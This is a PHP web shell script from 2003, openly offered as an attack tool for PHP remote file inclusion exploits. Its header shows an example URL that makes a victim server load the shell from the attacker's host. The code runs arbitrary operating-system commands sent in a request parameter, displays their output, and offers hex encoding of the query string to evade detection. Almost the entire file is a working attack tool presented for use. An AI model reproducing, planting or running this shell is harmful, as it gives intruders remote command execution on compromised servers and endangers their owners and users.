<?php   
/*******************************************************************
 *					                           *
 *  Author  : snooq [ http://www.angelfire.com/linux/snooq ]       *
 *  Filename: shell.php						   *   
 *  Date    : 26 Feb 2003 ( Last revised on 5 Mar 2003 )           *
 *                                                                 *
 *  This is a simple PHP based interactive shell to be used in     *
 *  PHP include() exploit.                                         *
 *                                                                 * 
 *  Tired of writing ad-hoc scripts and hence decided to put all   *
 *  that I need in one and reuse it next time. Also, added a few   *
 *  features to make it more 'kiddy' friendly.                     *
 *                                                                 *
 *  e.g. http://victim/in.php?file=http://your_host/shell.php      *
 *                                                                 *
 *  Tested on Mozilla 1.0, 1.3 & IE 5.0, 5.5, 6.0 only.            *
 *                                                                 * 
 *  Any bug report is welcome.                                     * 
 *                                                                 * 
 *  Disclaimer                                                     *
 *  ==========                                                     *
 *  Use at ur own risk. The author shall not be held responsible   *
 *  for any illegal use of this code.                              *
 *                                                                 *
 *  Any flames or comments, direct them to jinyean at hotmail.com  *   
 *                                                                 * 
 *******************************************************************/

if (!$_REQUEST['cmd']) {
	$width=$_POST['width']?$_POST['width']:980;
	$height=$_POST['height']?$_POST['height']:490;
	$size=$_POST['size']?$_POST['size']:100;
?>
<html>
<title>Generic PHP include() exploit - by snooq [ jinyean@hotmail.com ]</title>
<script language="javascript">

var idx=0;
var cur=0;
var MAX=10;	// Edit this to change history size.
var cmd_array=new Array(MAX);

function encode(s) {
	var a,b,d;
	var hex="";
	for (var i=0; i<s.length; i++) {
		d=s.charCodeAt(i);
		if (d==61) {
			hex+="=";
		}
		else if (d==38) {
			hex+="&";
		}
		else {
			a=d%16;
			b=(d-a)/16;
			hex+='%'+"0123456789ABCDEF".charAt(b)+"0123456789ABCDEF".charAt(a);
		}
	}
	return hex;
}

function checkkey(e) {
	var keyCode=e.which?e.which:e.keyCode; 
	if (keyCode==13) {
		cstr=document.form2.elements[1].value;
		if (!(cstr=="")) {  
			addhist(cstr);
			sendcmd();
		}
	}
	else if (keyCode==38) {
		document.form2.elements[1].value=getup();
	}
	if (keyCode==40) {
		document.form2.elements[1].value=getdown();
	}
}

function sendcmd() {
	var uri=document.form2.elements[0].value;
	var url=uri+escape(document.form2.elements[1].value);
	if (document.form1.elements[5].checked) {
		var i=url.indexOf("?");
		var s=url.substring(i+1);
		url=url.substring(0,i+1)+encode(s);
	}
	frames['out'].location.href=url;
	document.form2.elements[1].value="";
}

function resize(i) {
	if (i==1) {
		document.form1.elements[0].value=760;
		document.form1.elements[1].value=300;
		document.form1.elements[2].value=60;
	}
	document.form1.submit();
}

function upload(u) {
	var nWin=window.open('about:blank','','location=no,status=no,toolbar=no,width=380,height=90');
	nWin.document.writeln('<title>Upload</title>');	
	nWin.document.writeln('<form action="'+u+'" method=post>');
	nWin.document.writeln('<input type=hidden name=cmd value=upfile>');
	nWin.document.writeln('Path/Filename: <input type=file name=filename><br>');
	nWin.document.writeln('Destination: <input type=text name=dest size=30>');
	nWin.document.writeln('<input type=submit name=submit value=Submit>');
	nWin.document.writeln('</form>')
	nWin.document.close();
}

function download(u) {
	var nWin=window.open('about:blank','','location=no,status=no,toolbar=no,width=360,height=18');
	nWin.document.writeln('<title>Download</title>');
	nWin.document.writeln('<form action="'+u+'" method=post>');
	nWin.document.writeln('<input type=hidden name=cmd value=downfile>');
	nWin.document.writeln('Path/Filename: <input type=text name=filename>');
	nWin.document.writeln('<input type=submit name=submit value=Submit>');
	nWin.document.writeln('</form>')
	nWin.document.close();
}

function addhist(s) {
	if (idx==MAX) { idx-=MAX; }
	cmd_array[idx]=s;
	cur=idx;
	idx++;
}

function getup() {
	var r=cmd_array[cur];
	if (cur==0) { cur+=MAX; }
	cur--;
	return r?r:"";
}

function getdown() {
	cur++;
	if (cur==MAX) { cur-=MAX; }
	var r=cmd_array[cur];
	return r?r:"";
}	

</script>

<form name=form1 method=post action="<?php echo $_SERVER['REQUEST_URI']; ?>">
<input type=hidden name="width"><input type=hidden name="height"><input type=hidden name="size">
<input type=submit name=med value="800x600" onclick="resize(1)">
<input type=submit name=big value="1024x768" onclick="resize(0)">
<input type=submit name=up value="Upload" onclick="upload('<?php echo $_SERVER['REQUEST_URI']; ?>');return false;">
<input type=submit name=down value="Download" onclick="download('<?php echo $_SERVER['REQUEST_URI']; ?>');return false;">
<input type=checkbox name=option> Check this to obfuscate the query string with hex encoding. 
</form>

<iframe id="out" name="out" width="<?php echo $width; ?>" height="<?php echo $height; ?>"></iframe>

<form name=form2 method=post onsubmit="return false;">
<input type=hidden name=uri value="<?php echo $_SERVER['REQUEST_URI']; ?>&cmd=">
Command to execute: <input type=text name=cmd size="<?php echo $size; ?>" onkeydown="checkkey(event);return true;">
<input type=submit name=submit value=submit onclick="sendcmd();return false;">
</form>

</html>
<?php
} else if ($_POST['cmd']=="upfile") {
	echo "Upload script here.";
} else if ($_POST['cmd']=="downfile") {
	echo "Download script here.";
}
else {
	$from=array("<",">");
	$to=array("&lt;","&gt;");
	$command=urldecode($_REQUEST['cmd']);
	$output=str_replace($from,$to,`$command`);
	echo "# $command<br>\n<pre>$output</pre>\n";
}
exit;
?>

